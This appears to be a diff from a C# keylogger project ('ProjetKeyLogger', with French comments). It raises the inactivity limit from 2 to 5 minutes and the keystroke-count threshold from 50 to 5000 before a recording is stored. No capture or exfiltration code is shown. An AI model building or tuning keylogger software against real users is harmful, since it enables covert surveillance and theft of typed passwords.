@@ -35,7 +35,7 @@ namespace ProjetKeyLogger
             sleep_time = 3;
 
             //on initialise le temps d'inactivité maximum (En minute)
-            temps_inactivite_max = 2;
+            temps_inactivite_max = 5;
 
             //On initialise la collection
             collection_enregistrement = new CollectionEnregistrement();
@@ -381,7 +381,7 @@ namespace ProjetKeyLogger
 
                     //SI le nombre de caracteres tapés a dépassé la limite
                     //Et si le temps d'innactivité a dépassé 5 minutes
-                    if (nb_caractere_tape > 50 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
+                    if (nb_caractere_tape > 5000 && (DateTime.Now.Minute - date_dernier_activite.Minute == temps_inactivite_max || DateTime.Now.Minute - date_dernier_activite.Minute - 60 == temps_inactivite_max) )
                     {
                         //On ajoute l'enregistrement a la collection
                         collection_enregistrement.ajouterNew(enregistrement);
